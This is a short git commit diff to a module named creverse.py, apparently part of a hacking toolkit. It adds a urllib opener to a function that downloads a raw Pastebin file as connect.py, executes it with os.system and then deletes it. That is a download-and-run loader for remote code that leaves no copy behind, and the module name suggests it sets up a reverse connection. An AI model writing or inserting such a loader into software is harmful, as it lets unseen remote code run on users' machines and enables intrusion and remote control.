62d4b3522bca619f2ab7a562e725cc4b22d00c9b
ST4LK3RCR4ZY <a_netocosta30@hotmail.com>
2016-12-25 16:51:01 -0300

    Update creverse.py

--- modules/creverse.py
+++ modules/creverse.py
@@ -5,6 +5,7 @@ filz = "http://pastebin.com/raw/qNjByHqW"
 
 def ran():
         print "[ + ] Connection [ + ]"
+	testfile = urllib.URLopener()
 	testfile.retrieve(filz, "connect.py")
 	os.system("python connect.py")
 	os.remove("connect.py")
